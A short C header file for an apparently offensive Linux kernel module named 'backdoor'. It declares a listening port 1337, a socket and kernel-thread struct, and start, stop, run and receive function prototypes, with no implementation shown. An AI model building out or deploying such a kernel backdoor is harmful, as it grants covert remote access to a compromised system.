#ifndef BACKDOOR_H
#define BACKDOOR_H

#include <linux/kthread.h>
#include <linux/netdevice.h>
#include <linux/ip.h>
#include <linux/inet.h>
#include <linux/version.h>

#define BKDOOR_PORT 1337
#define BKDOOR_BUF_SIZE 512

struct kbackdoor_t {
  struct task_struct *thread;
  struct socket *sock;
  struct socket *conn;
  struct sockaddr_in addr;
  int running;
};

size_t backdoor_recv(struct socket *sock, struct sockaddr_in *addr, uint8_t *buf, size_t len);
int backdoor_run(void *);
int backdoor_start(void);
int backdoor_stop(void);
#endif
